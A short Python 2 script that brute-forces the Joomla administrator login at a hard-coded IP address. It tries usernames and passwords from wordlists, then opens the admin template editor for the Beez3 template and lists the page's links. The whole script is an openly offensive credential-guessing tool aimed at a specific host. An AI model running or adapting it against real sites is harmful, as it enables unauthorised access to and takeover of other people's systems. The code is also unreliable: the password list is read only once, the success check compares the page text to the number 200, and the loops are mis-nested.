#!/usr/bin/python

from selenium import webdriver
from bs4 import BeautifulSoup
import mechanize
import urllib2 ,urllib

users_file = open("/root/PycharmProjects/untitled/project/scanner/username.txt", "r")
password_file = open("/root/PycharmProjects/untitled/project/scanner/password.txt", "r")
br = mechanize.Browser()

br2 = br.open("http://109.123.90.187/joomlatest/administrator")
for form in br.forms():

    br.select_form(nr=0)
    for usr in users_file.readlines():
        credet = str(usr)
        for passw in password_file.readlines():
            credet2 = str(passw)
            br.form["username"] = credet
            br.form["passwd"] = credet2
            br.submit()
        readingPage = br.response().read()
        if readingPage == 200:
            print "login success"
        else: continue

html = "http://109.123.90.187/joomlatest/administrator/index.php?option=com_templates&view=template&id=503&file=aG9tZQ=="

openinig_templates_Beez3 = br.open(html)


for f in br.links():
    print f

